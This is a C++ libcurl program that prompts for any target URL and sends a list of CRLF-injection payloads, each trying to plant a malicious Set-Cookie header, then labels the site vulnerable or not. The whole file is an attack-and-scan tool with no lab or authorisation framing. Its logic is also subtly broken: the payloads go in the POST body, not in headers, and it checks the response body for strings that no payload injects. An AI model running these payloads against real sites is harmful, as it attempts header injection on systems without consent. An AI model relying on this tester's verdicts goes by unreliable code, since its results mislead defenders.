#include <iostream>
#include <vector>
#include <string>
#include <curl/curl.h>

using namespace std;

// Callback function to handle HTTP response
size_t writeCallback(char* ptr, size_t size, size_t nmemb, string* data) {
    data->append(ptr, size * nmemb);
    return size * nmemb;
}

// Function to test for vulnerabilities
void testCRLFInjection(const string& payload, const string& targetURL) {
    CURL* curl = curl_easy_init();
    if (curl) {
        // Set URL
        curl_easy_setopt(curl, CURLOPT_URL, targetURL.c_str());

        // Set payload data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        // Response data
        string response_data;

        // Set response data handler
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            if (response_data.find("maliciousCookie=maliciousValue") != string::npos ||
                response_data.find("Refresh: 0") != string::npos ||
                response_data.find("Content-Length: 0") != string::npos ||
                response_data.find("Location: https://www.bbc.com") != string::npos) {
                cout << "Vulnerable to CRLF Injection: " << payload << endl;
            } else {
                cout << "Not vulnerable to CRLF Injection: " << payload << endl;
            }
        } else {
            cerr << "Error performing request: " << curl_easy_strerror(res) << endl;
        }

        // Clean up
        curl_easy_cleanup(curl);
    } else {
        cerr << "Failed to initialize libcurl" << endl;
    }
}

int main() {
    // Prompt for the target URL
    cout << "Enter your target URL: ";
    string targetURL;
    getline(cin, targetURL);

    // Craft payloads with various CRLF injection techniques
    vector<string> payloads = {
    // CRLF injection in Host header
    "Host: example.com%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Accept header
    "Accept: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Accept-Language header
    "Accept-Language: en-US%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Accept-Encoding header
    "Accept-Encoding: gzip, deflate%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Connection header
    "Connection: close%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Cache-Control header
    "Cache-Control: no-cache%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Content-Type header
    "Content-Type: application/x-www-form-urlencoded%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Content-Encoding header
    "Content-Encoding: gzip%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Content-Disposition header
    "Content-Disposition: attachment; filename=test.txt%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Content-Language header
    "Content-Language: en%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A",

    // CRLF injection in Content-Location header
    "Content-Location: /index.html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A"
};


    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);

    // Loop through payloads and test for vulnerabilities
    for (const string& payload : payloads) {
        testCRLFInjection(payload, targetURL);
    }

    // Cleanup libcurl
    curl_global_cleanup();

    return 0;
}
